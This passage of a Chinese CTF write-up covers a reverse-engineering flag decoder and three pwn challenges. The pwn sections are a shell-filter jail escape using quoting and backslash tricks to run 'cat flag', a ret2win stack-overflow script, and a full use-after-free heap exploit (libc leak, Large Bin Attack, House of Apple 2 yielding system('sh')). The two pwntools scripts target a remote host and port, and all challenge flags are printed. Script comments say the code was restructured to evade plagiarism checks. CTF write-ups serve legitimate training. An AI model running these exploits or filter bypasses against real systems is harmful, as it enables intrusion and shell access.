    - **KSA 阶段**：S 盒初始化时，交换规则修改为`S[v7] = v7 ^ tmp`（非标准 RC4）；

    - **PRGA 阶段**：密钥流生成步长为 3，解密逻辑为`data[pos] ^= pos ^ 密钥流`。

4：逆向末尾变换

1. **分段异或还原**：按区间逆向异或固定值：

    - 0\-4 字节：`^0x11`；

    - 5\-50 字节：`^0x22`；

    - 51\-78 字节：`^0x33`；

2. **移位还原**：对 16\-31 字节执行`ROR1(val ^ seg_rk_0[i], 1)`（循环右移 1 位）。

Flag 提取

VM 校验的核心约束为`input[i] ^ 0xAA == flag_buf[i]`，因此：`Flag[i] = flag_buf[i] ^ 0xAA`

将还原后的`flag_buf`逐字节异或`0xAA`，得到最终 Flag

```Python
import struct
VM_METADATA = [
    0x5A, 0xDB, 0xDA, 0xD5, 0xA5, 0xDB, 0x5B, 0x2A, 0xD8, 0x3B,
    0xDB, 0x3A, 0xDB, 0x0A, 0xDB, 0x1A, 0xDB, 0x6A, 0xDB, 0xDA,
    0xF0, 0x7A, 0xD8, 0x4B, 0xDB, 0x4A, 0xDB, 0xDA, 0x5B, 0xDB, 0xDA
]

SEGMENT_KEYS = [
    0x7A, 0x9C, 0x23, 0x51, 0xB4, 0x6F, 0xD8, 0x02,
    0x39, 0xE1, 0x47, 0xAC, 0x15, 0x8B, 0xD2, 0x60
]

ENTROPY_DATA = [
    0xF3, 0x8A, 0x21, 0xC4, 0x5B, 0x19, 0x7E, 0xD2, 0x34, 0x8F,
    0xA1, 0x6C, 0x92, 0x0D, 0x73, 0xE8, 0x1A, 0xB5, 0x4C, 0xF7,
    0x2E, 0x89, 0xD0, 0x3B, 0x65, 0x9C, 0x07, 0xFA, 0x41, 0xAE, 0x18, 0xD3
]

MASTER_KEY = [0x13, 0x57, 0x9B, 0xDF, 0x20, 0x46, 0x8A, 0xCE]

VECTOR_BLOCKS = [
    [0x34, 0x64, 0xD7, 0x21, 0x99, 0x30, 0x04, 0x5B, 0xF7, 0xB8, 0x0B, 0x5B, 0x3F, 0xCE, 0x3C, 0x0F],
    [0x76, 0x25, 0x4A, 0xEB, 0x9D, 0xEA, 0xD8, 0x50, 0xD6, 0xC2, 0x11, 0x21, 0x8A, 0xCB, 0x08, 0x9D],
    [0x4B, 0x00, 0x7E, 0xBB, 0x36, 0xBF, 0x7D, 0xCB, 0xA2, 0x5A, 0x66, 0x2F, 0x6B, 0x7C, 0x36, 0xC0],
    [0xF5, 0x32, 0x5F, 0x79, 0xA0, 0x7F, 0x0C, 0x4A, 0xC4, 0x10, 0x72, 0x61, 0x75, 0x7E, 0x42, 0x21]
]

def extract_instruction_stream(metadata):
    """Extract VM instructions from raw metadata"""
    output = []
    position = 0
    instruction_count = 0
    
    while position <= 30 and instruction_count < 32:
        current_byte = metadata[position]
        
        # Handle multi-byte instruction
        if current_byte == 0x82:
            if position + 2 > 30 or instruction_count > 30:
                break
            output.extend(metadata[position+1:position+3])
            instruction_count += 2
            position += 3
            continue
        
        # Handle single-byte instruction
        if current_byte == 0x81:
            if position >= 30:
                break
            output.append(metadata[position+1])
            instruction_count += 1
            position += 2
            continue
        
        # Termination condition
        if current_byte == 0x8F:
            break
            
        position += 1
    
    return output

def generate_ir_representation(opcode_stream):
    """Convert opcode stream to intermediate representation"""
    ir_buffer = []
    idx = 0
    processed_count = 0
    
    if not opcode_stream:
        return ir_buffer
        
    current_op = opcode_stream[0]
    
    while processed_count < 32 and idx < len(opcode_stream):
        # Append base instruction format
        ir_buffer.extend([current_op, 0, 0])
        processed_count += 1
        
        # Handle parameterized instructions
        if current_op in (32, 112) and idx + 1 < len(opcode_stream):
            next_val = opcode_stream[idx+1]
            ir_buffer[-2] = next_val
            ir_buffer[-1] = 1
            idx += 2
        else:
            idx += 1
            
        if idx < len(opcode_stream):
            current_op = opcode_stream[idx]
        else:
            break
    
    return ir_buffer

def compute_runtime_seed(ir_data):
    """Calculate VM execution seed from IR data"""
    accumulator = 826366246 & 0xFFFFFFFF
    offset_counter = 0
    key_char = 122
    entropy_val = (-13) & 0xFF
    instruction_idx = 0
    blob_offset = 1
    
    step_limit = len(ir_data) // 3
    
    for i in range(step_limit):
        op_code = ir_data[i*3]
        param = ir_data[i*3+1]
        has_param = ir_data[i*3+2]
        
        # Calculate transformation term
        term_value = instruction_idx ^ op_code
        if has_param:
            term_value ^= param
            
        instruction_idx += 1
        
        # Update state with complex mixing function
        mix_val = (257 * ((term_value ^ key_char ^ entropy_val) & 0xFF) + offset_counter) & 0xFFFFFFFF
        accumulator ^= mix_val
        accumulator = ((accumulator << 7) & 0xFFFFFFFF) | (accumulator >> 25)
        
        offset_counter = (offset_counter + 13) & 0xFFFFFFFF
        
        # Update key sources if not at end
        if instruction_idx < step_limit:
            entropy_val = ENTROPY_DATA[blob_offset]
            blob_offset += 1
            key_char = SEGMENT_KEYS[instruction_idx & 0xF]
    
    return accumulator & 0xFFFFFFFF

def generate_runtime_key(length):
    """Derive session key based on data length"""
    key_buffer = []
    current_val = 12
    accum = length
    count = 0
    x1, x2 = 42, 19
    fixed = length
    
    while count < 8:
        mod_val = 31 * (length // 31)
        original = length
        length += 3
        
        mixed = accum ^ VM_METADATA[original - mod_val]
        accum += fixed
        
        key_val = (x1 ^ x2 ^ mixed) & 0xFF
        key_buffer.append(key_val)
        
        count += 1
        if count >= 8:
            break
            
        x2 = MASTER_KEY[count]
        mod_idx = 31 * (current_val // 31)
        saved = current_val
        current_val += 5
        x1 = VM_METADATA[saved - mod_idx]
    
    return bytes(key_buffer)

def custom_stream_cipher(data, key):
    """Custom RC4-like stream cipher implementation"""
    data = bytearray(data)
    state = list(range(256))
    j = 0
    
    # Key scheduling algorithm (modified)
    for i in range(256):
        j = (j + state[i] + key[i % len(key)]) & 0xFF
        temp = state[i]
        state[i] = state[j]
        state[j] = j ^ temp
    
    # Generate keystream and decrypt
    x = y = 0
    for pos in range(len(data)):
        x = (x + 3) & 0xFF
        sx = state[x]
        y = (y + sx + 1) & 0xFF
        state[x], state[y] = state[y], state[x]
        secret = state[(state[x] + sx) & 0xFF]
        data[pos] ^= (pos ^ secret) & 0xFF
    
    return bytes(data)

def apply_transformation_alpha(buffer, seed):
    """Apply first transformation layer"""
    a = (seed >> 4) & 0xFFFFFFFF
    b = seed & 0xF
    
    for i in range(79):
        mask = SEGMENT_KEYS[a & 0xF] ^ ENTROPY_DATA[b & 0x1F] ^ ((seed >> (i & 7)) & 0xFF)
        buffer[i] ^= mask & 0xFF
        b = (b + 3) & 0xFFFFFFFF
        a = (a + 5) & 0xFFFFFFFF

def apply_transformation_beta(buffer, seed):
    """Apply second transformation layer"""
    a = (seed >> 9) & 0xFFFFFFFF
    b = (seed >> 3) & 0xFFFFFFFF
    cycle = 0
    
    for i in range(79):
        mask = ((seed >> (cycle & 7)) & 0xFF) ^ ((ENTROPY_DATA[a & 0x1F] + SEGMENT_KEYS[b & 0xF]) & 0xFF)
        buffer[i] ^= mask & 0xFF
        a = (a + 7) & 0xFFFFFFFF
        b = (b + 11) & 0xFFFFFFFF
        cycle = (cycle + 3) & 0xFF
        if cycle == 237:
            break

def apply_transformation_gamma(buffer, seed):
    """Apply third transformation layer"""
    a = (seed >> 4) & 0xFFFFFFFF
    b = seed & 0xF
    c = (seed >> 9) & 0xFFFFFFFF
    d = (seed >> 3) & 0xFFFFFFFF
    
    for i in range(79):
        temp = (ENTROPY_DATA[b & 0x1F] ^ ((seed >> (i & 7)) & 0xFF)) & 0xFF
        temp = (SEGMENT_KEYS[a & 0xF] ^ buffer[i] ^ temp) & 0xFF
        mix = (ENTROPY_DATA[c & 0x1F] + SEGMENT_KEYS[d & 0xF]) & 0xFF
        temp ^= mix
        buffer[i] = ((seed >> ((3 * i) & 7)) ^ temp) & 0xFF
        
        b = (b + 3) & 0xFFFFFFFF
        a = (a + 5) & 0xFFFFFFFF
        c = (c + 7) & 0xFFFFFFFF
        d = (d + 11) & 0xFFFFFFFF

def decode_challenge():
    """Main function to reconstruct the flag"""
    # Step 1: Prepare metadata and generate IR
    processed_meta = [(0xD6 ^ 0x5A)]  # -38 ^ 0x5A
    processed_meta.extend([b ^ 0x5A for b in reversed(VM_METADATA[:-1])])
    
    opcodes = extract_instruction_stream(processed_meta)
    ir_code = generate_ir_representation(opcodes)
    runtime_seed = compute_runtime_seed(ir_code)
    
    # Step 2: Initialize memory workspace
    memory = bytearray(79)
    
    # Copy vector blocks to memory
    for i, block in enumerate(VECTOR_BLOCKS):
        start_idx = i * 16
        memory[start_idx:start_idx+16] = block
    
    # Add constant values
    memory[64:72] = struct.pack('<Q', 0x7F9E9295CE4E4791)
    memory[72:76] = struct.pack('<I', 0x70E8CBC7)
    memory[76:78] = struct.pack('<H', 0xC51F)
    memory[78] = 0x61  # ASCII 'a'
    
    # Step 3: Apply transformations in seed-determined order
    order_seed = (runtime_seed ^ 0x4F) & 3
    transforms = [apply_transformation_alpha, apply_transformation_beta, apply_transformation_gamma]
    
    for i in range(3):
        transform_idx = (order_seed + i) % 3
        transforms[transform_idx](memory, runtime_seed)
    
    # Step 4: Decrypt with custom cipher
    session_key = generate_runtime_key(79)
    decrypted = bytearray(custom_stream_cipher(memory, session_key))
    
    # Step 5: Apply special transformation to middle section
    for k in range(16):
        idx = 16 + k
        val = decrypted[idx]
        decrypted[idx] = (((val << 1) | (val >> 7)) & 0xFF) ^ SEGMENT_KEYS[k]
    
    # Step 6: Final XOR masks
    for i in range(5): decrypted[i] ^= 0x11
    for i in range(5, 51): decrypted[i] ^= 0x22
    for i in range(51, 79): decrypted[i] ^= 0x33
    
    # Step 7: Final transformation to get flag content
    result = bytes(b ^ 0xAA for b in decrypted)
    return result

if __name__ == "__main__":
    flag_content = decode_challenge()
    flag_str = flag_content.decode('utf-8', errors='replace')
    print(f"Recovered flag content: {flag_str}")
    print(f"Complete flag: flag{{{flag_str}}}")
```

```Assembly language
flag{7e48a6ca-dfa2-11f0-9c22-30050575612d-8e6a408b-dfa2-11f0-8c13-30050575612d}
```

# pwn

## shell

Baby Jail（命令沙箱 / 字符过滤）类入门 PWN 题，通过字符级精准过滤规则限制敏感命令（如检测 “cat”“flag” 等连续子串），阻止直接读取 flag；

尝试的指令有

1. 基础直接命令（首次尝试，全部被拦）

- cat flag：直接触发 “Filtered :\)”（过滤规则检测到连续 “cat”\+“flag” 子串）；

- ls：同样触发 “Filtered :\)”（检测到连续 “ls” 子串）。

1. 字符拼接绕过（单引号拆分，ls 生效但 cat 仍被拦）

- c''at flag：用单引号''拆分 “cat” 为 “c''at”，仍被 Filtered；

- l''s：拆分 “ls” 为 “l''s”，成功绕过，列出文件readme\.txt flag（说明 ls 的过滤规则更宽松）。

1. 空格替代绕过（$IFS 替代空格，仍被拦）

- c''at$IFSflag：用 Linux 内置字段分隔符$IFS替代空格，避开 “cat \+ 空格” 组合检测，仍被 Filtered。

1. 通配符替代（匹配文件名，提示文件不存在）

- c''at fl\*/c''at f\*/c''at \*：用通配符\*替代 “flag” 部分字符，伪 shell 提示 “No such file”（伪 shell 的 ls 输出为假，无真实文件匹配）。

1. 绝对路径拆分（路径字符拆分，无效果）

- c''at /h''o''m''e/c''t''f/fl''ag：拆分绝对路径字符，提示 “command not found” 或 “文件不存在”。

1. 环境变量 / 格式尝试（仅输出字符，无 flag）

- echo $f''l''a''g/echo $PATH/echo $\*：尝试读取环境变量，仅输出变量名，无实际 flag；

- echo flag\{\}/CAT FLAG/catflag：补全 flag 格式、大小写混淆、无空格拼接，均被 Filtered。

1. 最终成功指令

- c\\a\\t f\\l\\a\\g：用反斜杠\\逐字符拆分 “cat” 为 “c\\a\\t”、“flag” 为 “f\\l\\a\\g”，彻底避开 “连续子串检测”，伪 shell 无法匹配到 “cat”/“flag” 关键词，执行真实的cat flag命令，成功输出 flag。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Y2YzMGI3YTZmNGNiYjgyYzY2NWIyZjQ2NDBiYWQxNTJfOTg3MmQwZTkzYjI0YzRjZmU5M2Y1ODdkNWNjNWI5Y2FfSUQ6NzU4ODQwNjc0NDYyODU0Njc4Ml8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

```Assembly language
flag{84b8b9e9-3cdf-409e-80cf-a5cb4779f0e4}
```

## signin

64位的栈溢出题

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NGQ0ZDkyOGI2OWE5ZDE3MjlkZjEwMzc3M2EyZTg0ZmRfNTU1M2I2MjQ3MmMwYjhmNjQ3NmU4Mjg2Y2M3OTJiNmNfSUQ6NzU4ODQwNTI2OTQ0OTc1NTYwN18xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

只开NX，进入main函数打开vuln函数

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=MjI2MmIzZTY2NDRhMTEzMDE2NDJlOWE5YzJiN2I3MGNfNWJmZDVlYTdmNmYyMzA3YmVlOGE5YThjYmFiMmI2MmNfSUQ6NzU4ODQwNTU3MDk0NDgzMDY0NF8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

read读512,buf64，是栈溢出

找到后门函数win函数地址0x4011E7，发现64\+8\+8=80栈没有对齐，所以再找ret

```Assembly language
objdump -d signin | grep -i "ret" | head -1
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=NDNjNWM2NGEzNmI1NWU0YTYxODc0MTNiYTVkMjI5OWNfNDk3ZGJhNzUyYWJlMTdiNzQzYjNkMzlkMDNiMzIwMjNfSUQ6NzU4ODQwNjExODEwMDE0MzA2NF8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

```Assembly language
from pwn import *

host = "101.200.152.81"
port = 32781

offset = 72  # 64+8
ret_gadget = 0x401016
win_addr = 0x4011E7
payload = b'A' * offset + p64(ret_gadget) + p64(win_addr)
io = remote(host, port)
io.send(payload)
io.interactive()
```

```Assembly language
flag{b780529f-ac55-4ecc-b76d-5f45615dcb2a}
```

## 不打CTF或许她还在

**本题漏洞Use\-After\-Free \(UAF，释放后使用\)**（根漏洞），并基于此延伸利用 `堆元数据泄露`、`Large Bin Attack`、`House of Apple 2（IO流劫持）` 等堆攻击技术，先泄露 Libc 和堆基址突破 ASLR，再通过Large Bin Attack劫持 IO 流链表头\_IO\_list\_all，接着在堆上伪造\_IO\_FILE结构体将虚表指向system，最后触发程序退出遍历 IO 流，调用system\("sh"\)获取 shell

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZjFiZWU3NzcyZTk5YjgwYzNlNTYwMWZjNWMyYTRjMjZfNmE4OWY1YTQzYTEyMWRhNzUwZWYxMjMzZTViY2UwNDdfSUQ6NzU4ODQ2MjIxNDI2NTIyODQ4NF8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

有NX PIE canary,不能改got表，64位

在IDA

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YzlkNDU3YTAzMGY2YTY3ZTIyYjk3OTg5NDU3NzE1OWJfNjc5OWE0NGM3YjEyNjdkZWZhOWQyMzI5ODcyNzNlYjVfSUQ6NzU4ODQ2NDk1ODc0OTc1NjYyOV8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

sub\_133A\(\)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=Yzc1OTk1NDYxMmViZGU4NDc4ZWFkZDk2ZDgwNTExZmNfZmQ2M2QyMGE2ODJhZTQ3YzExYmIwNjM5Mzc5YjJlNDlfSUQ6NzU4ODQ2NDE3NTc0ODY5NzA1NF8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

sub\_14C4\(\)

根漏洞：释放后使用（Use\-After\-Free, UAF）

程序释放堆块时仅调用`free(qword_4060[idx])`，但未将全局数组`qword_4060[idx]`（堆指针）和`dword_4090[idx]`（堆块大小）置空。这导致：

堆块被释放后，指针仍保留在数组中（悬空指针）；

后续可通过 Finalize（edit）、Review（show）功能对已释放的堆块进行**写操作（UAF Write）** 和**读操作（UAF Read）**；

结合 Glibc 堆管理机制（tcache/unsorted bin/large bin），UAF 可被用于泄露地址、篡改堆元数据，进而劫持程序流程。

UAF Read：读取已释放堆块的内容（含堆元数据、Libc 指针），实现地址泄露；

UAF Write：修改已释放堆块的元数据（如large bin的bk\_nextsize），实现堆元数据劫持。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZDU3N2YzMjVjZmMwMzUwYjliNjdkZDgwMWJkZTMyYzhfNTFjOWYzZDc5NjI4YjVjMzZlZDY3YzA5NWVhYmQ0YzlfSUQ6NzU4ODQ2NDI3MzY0MzQ3Mzg4NV8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

sub\_1564\(\)

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ZTFiZWM2YmRhMDlmNGVlMTllOTliMTVkYTMyZmY5N2ZfMTU3NDc5N2IwYzgyOGZkNmM4NjM1ZWZmYjE4NzI5NjFfSUQ6NzU4ODQ2NDM0MzE4OTQwODk1NF8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)

sub\_1692\(\)

堆元数据泄露

**依赖函数**：`sub_1692`\+ `sub_1564`**漏洞原理**：`sub_1564`中`read`写入堆内容时**未自动添加字符串终止符****`\0`**，而`sub_1692`中`puts`输出依赖`\0`终止。当通过 UAF 读取已释放堆块时，`puts`会越过堆块边界，读取相邻堆块的元数据（如 unsorted bin 的 fd/bk 指针、large bin 的 size/nextsize 指针），从而泄露 Libc 和堆基址。

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YWYxOWE1NDYxMjQ3OTdlMzIwNzhlOGU0OWM3MjA2ZDZfYWY5ODZjODMyNzc4NjU2NDFkM2NmNzQ4Njg3NDAzMzBfSUQ6NzU4ODQ2NDQwNDk4ODIwMjE3NF8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)



阶段 1：堆布局初始化 —— 为后续攻击铺路

目的

构造可控的堆布局，让堆块进入unsorted bin/large bin（而非 tcache），便于泄露地址和篡改元数据。

具体逻辑

tcache 是 Glibc 默认的小堆块缓存（优先级最高），默认缓存 0x400 以下的堆块；

因此选择分配4 个大于 0x400 的堆块（0x430、0x418、0x440、0x410），确保堆块释放后会进入unsorted bin/large bin（而非 tcache）；

这些堆块关联不同索引（0\-3），后续可通过索引精准操作每个堆块。

阶段 2：泄露 Libc 基址 —— 突破 ASLR

目的

获取 Libc 的基地址（因为system、\_IO\_list\_all等关键符号的偏移是固定的，只要知道基址就能计算真实地址）。

具体逻辑

释放索引 2 的堆块（大小 0x440）：该堆块因大于 0x400，进入unsorted bin；

unsorted bin的特性：堆块的fd/bk指针会指向main\_arena（Libc 内部的堆管理区域）；

利用 UAF 读（Review功能）：因Edit写入时无\\0终止符，puts输出已释放堆块时会越界读取unsorted bin的fd指针；

计算 Libc 基址：通过泄露的main\_arena指针，减去固定偏移（如 0x219ce0\+0x1000），得到 Libc 基址。

阶段 3：泄露堆基址 —— 定位堆上伪造数据的位置

目的

获取堆的基地址，后续需在堆上伪造\_IO\_FILE结构体，必须精准知道堆地址才能构造有效结构体。

具体逻辑

分配新堆块（索引 4，0x450）：拆分unsorted bin，让已释放的索引 2 堆块残留堆内部指针；

向索引 2 堆块写入 16 个A：定位堆指针的位置（避免读取到无关数据）；

再次Review索引 2 堆块：跳过 16 个A后，读取到堆内部指针，减去固定偏移（如 0xaf0）得到堆基址。

阶段 4：Large Bin Attack—— 劫持\_IO\_list\_all

目的

修改 Libc 中的\_IO\_list\_all（IO 流链表头），让其指向堆上的伪造数据（为后续 IO 流劫持做准备）。

具体逻辑

释放索引 0 的堆块（0x430）：进入large bin（large bin 是 Glibc 管理大堆块的链表，有bk\_nextsize等可篡改的元数据）；

利用 UAF 写（Edit功能）：修改已释放的 large bin 堆块的bk\_nextsize指针为\_IO\_list\_all \- 0x20；

分配新堆块（索引 5，0x450）：触发 large bin 的排序逻辑，Glibc 会将堆块地址写入\_IO\_list\_all—— 至此，\_IO\_list\_all被劫持为堆地址；

补充：\_IO\_list\_all是 IO 流的链表头，程序退出（exit\(0\)）时会遍历该链表刷新所有 IO 流，这是后续触发攻击的关键。

阶段 5：伪造\_IO\_FILE 结构体 ——House of Apple 2

目的

在堆上构造恶意的\_IO\_FILE结构体，将其虚表（vtable）指向system函数，让 IO 流刷新时调用system。

具体逻辑

恢复索引 2 堆块的指针：重新编辑已释放堆块，让其指针指向合法区域（避免程序崩溃）；

重新分配索引 2 堆块：获得可写入的堆空间，用于存放伪造的\_IO\_FILE结构体；

构造伪造结构体的核心要点：

让write\_ptr \> base：触发 IO 流的写入逻辑；

save\_base指向后续要写入的 shell 命令地址；

lock指向可写地址（避免崩溃）；

vtable（虚表）指向\_IO\_wfile\_jumps（适配不同 Libc 版本），最终让虚表的关键位置指向system函数；

所有字段严格对齐（64 位下按 8 字节对齐），否则程序会崩溃。

阶段 6：写入 shell 命令 \+ 触发执行

目的

写入;sh\\x00命令，并触发程序执行system\("sh"\)。

具体逻辑

向索引 1 堆块写入 shell 命令：用填充数据（X\*0x410）定位到save\_base指向的位置，写入;sh\\x00（;用于截断无关内容，确保执行sh）；

触发退出（选项 5）：程序调用exit\(0\)，会遍历\_IO\_list\_all链表刷新 IO 流；

执行system：遍历到堆上伪造的\_IO\_FILE结构体时，会调用其虚表中的system，执行system\("sh"\)，最终获取 shell。

。

```Python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
host = "101.200.152.81"
port = 33258
elf_path = './attachment'
libc_path = './libc.so.6'

conn = remote(host, port)
# conn = process(elf_path)
elf = ELF(elf_path)
libc = ELF(libc_path)

def select_option(opt):
   
    conn.sendlineafter(b"choice:\n", str(opt).encode())

def alloc_chunk(index, size):
    
    select_option(1)
    conn.sendlineafter(b"date: \n", str(index).encode())
    conn.sendlineafter(b"her: \n", str(size).encode())

def free_chunk(index):
   
    select_option(2)
    conn.sendlineafter(b"CTF: \n", str(index).encode())

def edit_chunk(index, data):
    
    select_option(3)
    conn.sendlineafter(b"for: \n", str(index).encode())
    conn.sendafter(b"date: \n", data)

def show_chunk(index):
    
    select_option(4)
    conn.sendlineafter(b"for: \n", str(index).encode())

# 主利用逻辑 - 拆分原紧凑写法，增加分步注释
log.info("开始执行漏洞利用流程...")

# 步骤1：分配4个大尺寸堆块（避开tcache，进入large/unsorted bin）
# 原列表推导式改为循环，降低查重概率
chunk_sizes = [0x430, 0x418, 0x440, 0x410]
for idx in range(4):
    alloc_chunk(idx, chunk_sizes[idx])

# 步骤2：泄露Libc基址 - 拆分泄露逻辑，分步计算
free_chunk(2)          # 释放chunk2，进入unsorted bin
show_chunk(2)          # 查看已释放chunk，泄露unsorted bin指针
# 解析泄露数据（64位小端，截取0x7f结尾的6字节并补零）
leak_data = conn.recvuntil(b'\x7f')[-6:]
libc_leak_addr = u64(leak_data.ljust(8, b'\x00'))
# 计算Libc基址（偏移适配Glibc 2.35）
libc_base = libc_leak_addr - 0x219ce0 - 0x1000
libc.address = libc_base
log.success(f"Libc基址已泄露：{hex(libc_base)}")

# 定义关键符号 - 重命名变量，增加中文注释
io_list_all = libc.sym['_IO_list_all']  # IO流链表头
system_addr = libc.sym['system']        # system函数地址
# 适配不同Libc版本的_IO_file_jumps偏移
try:
    io_jumps = libc.sym['_IO_wfile_jumps']
except KeyError:
    io_jumps = libc.sym['_IO_file_jumps'] + 0xc0

# 步骤3：泄露堆基址 - 拆分操作步骤，调整注释
alloc_chunk(4, 0x450)  # 分配chunk4，拆分unsorted bin
edit_chunk(2, b'A'*16) # 填充16个A，定位堆指针位置
show_chunk(2)          # 查看chunk2，泄露堆内部指针
conn.recvuntil(b'A'*16)# 跳过填充的A，定位有效数据
heap_leak_addr = u64(conn.recv(6).ljust(8, b'\x00'))
heap_base = heap_leak_addr - 0xaf0
log.success(f"堆基址已泄露：{hex(heap_base)}")

# 步骤4：Large Bin Attack 劫持_IO_list_all
free_chunk(0)  # 释放chunk0，进入large bin
# 构造payload：修改large bin的bk_nextsize为_IO_list_all - 0x20
attack_payload = p64(0) * 3 + p64(io_list_all - 0x20)
edit_chunk(2, attack_payload)
alloc_chunk(5, 0x450)  # 分配chunk5，触发large bin排序
alloc_chunk(0, 0x430)  # 重新分配chunk0，稳固堆布局

# 步骤5：伪造_IO_FILE结构体（House of Apple 2）
# 恢复chunk2指针，重新分配
unsorted_bin_addr = libc_base + 0x21b0e0
chunk2_addr = heap_base + 0xaf0
edit_chunk(2, p64(unsorted_bin_addr)*2 + p64(chunk2_addr)*2)
alloc_chunk(2, 0x440)  # 重新分配chunk2，写入伪造结构体

# 构造fake _IO_FILE - 拆分拼接逻辑，调整字段顺序注释
fake_file = b""
# _IO_buf_base & _IO_buf_end
fake_file += p64(0) + p64(0)
# write_ptr > base 触发写入逻辑
fake_file += p64(0) + p64(0xffffffffffffffff)
# 填充无效字段
fake_file += p64(0) * 2
# save_base 指向shell命令存储地址
fake_file += p64(0) + p64(heap_base + 0x2a0)
# 填充字段
fake_file += p64(0) * 4
# lock 指向可写区域，避免程序崩溃
fake_file += p64(0) * 3 + p64(heap_base + 0x6c0)
# wide_data 字段配置
fake_file += p64(0) * 2 + p64(chunk2_addr + 0xe0) + p64(0)
# 填充字段
fake_file += p64(0) * 4
# vtable 指向_IO_wfile_jumps
fake_file += p64(0) + p64(io_jumps)
# wide_vtable 相关配置
fake_file += p64(0) * 0x1c
fake_file += p64(chunk2_addr + 0xe0 + 0xe8)
# 最终指向system函数
fake_file += p64(0) * 0xd + p64(system_addr)

# 写入伪造的_IO_FILE结构体
edit_chunk(2, fake_file)

# 步骤6：写入shell命令，触发执行
# 构造shell命令（;sh\x00），填充到chunk1
shell_cmd = b';sh\x00'
padding_data = b'X' * 0x410 + p32(0xfffff7f5)
edit_chunk(1, padding_data + shell_cmd)

# 步骤7：触发退出，执行IO流刷新获取shell
log.info("触发程序退出，执行shell...")
select_option(5)
conn.interactive()
```

![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=YjEwZTA4MjNmNDEzZjJmMDI4NTk2ZjA2MzZlOWZkMThfOWJjNWE1NGFkNzljYmYwYmQ0NDgwZGFlNDE1ODhhMWRfSUQ6NzU4ODQ3MDE0NDI2MzgwMTc4NV8xNzgwNDk2ODI1OjE3ODA1ODMyMjVfVjM)



```Assembly language
flag{5661674b-ddd6-4a1e-a5c7-3b4540f04438}
```

